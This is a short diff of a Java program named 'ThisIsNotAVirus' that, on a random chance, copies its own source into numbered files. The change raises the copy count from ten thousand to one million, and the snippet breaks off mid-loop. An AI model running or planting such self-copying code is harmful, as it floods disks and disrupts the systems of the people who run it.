@@ -7,7 +7,7 @@ class ThisIsNotAVirus {
     public static void main(String[] args) throws FileNotFoundException {
         boolean isVirus = Math.random() > 0.5;
         if (isVirus) {
-            for (int i = 0; i < 10000; i++) {
+            for (int i = 0; i < 1000000; i++) {
                 PrintWriter out = new PrintWriter("ThisIsNotAVirus" + i + ".java");
                 FileReader reader = new FileReader("ThisIsNotAVirus.java");
                 Scanner in = new Scanner(reader);
